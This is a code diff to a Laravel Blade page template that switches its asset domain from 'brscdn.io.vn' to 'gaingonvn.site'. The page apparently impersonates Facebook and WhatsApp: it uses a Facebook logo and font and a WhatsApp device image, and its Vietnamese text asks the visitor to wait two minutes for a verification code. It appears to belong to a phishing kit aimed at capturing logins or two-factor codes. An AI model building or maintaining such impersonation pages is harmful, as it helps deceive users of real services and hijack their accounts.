@@ -15,7 +15,7 @@
     <meta property="og:image" content="{{ $data->image }}" />
     <meta property="og:type" content="article" />
     <link rel="shortcut icon"
-        href="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/fblogo.png">
+        href="https://{{ env('APP_CDN_DOMAIN', 'gaingonvn.site') }}/theme/system/facebook/fblogo.png">
     @vite(['resources/css/app.css'])
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"
         integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g=="
@@ -39,7 +39,7 @@
 
         @font-face {
             font-family: 'MyRulersVjpPro';
-            src: url('https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/fb_font.woff2') format('woff2');
+            src: url('https://{{ env('APP_CDN_DOMAIN', 'gaingonvn.site') }}/theme/system/facebook/fb_font.woff2') format('woff2');
         }
 
         body {
@@ -57,7 +57,7 @@
             <p class="text-[14px] text-black leading-relaxed mb-5">
                 Vui lòng đợi <b id="countdown_2mins">02:00</b> để được chuyển tiếp đến mã xác minh của bạn</p>
             <div class="rounded-xl overflow-hidden mb-5">
-                <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/user/whatsapp/whatsapp_device.jpg"
+                <img src="https://{{ env('APP_CDN_DOMAIN', 'gaingonvn.site') }}/theme/user/whatsapp/whatsapp_device.jpg"
                     alt="Xác minh thiết bị" class="w-full h-auto">
             </div>
             {{-- <div class="flex items-center gap-3 mb-5">
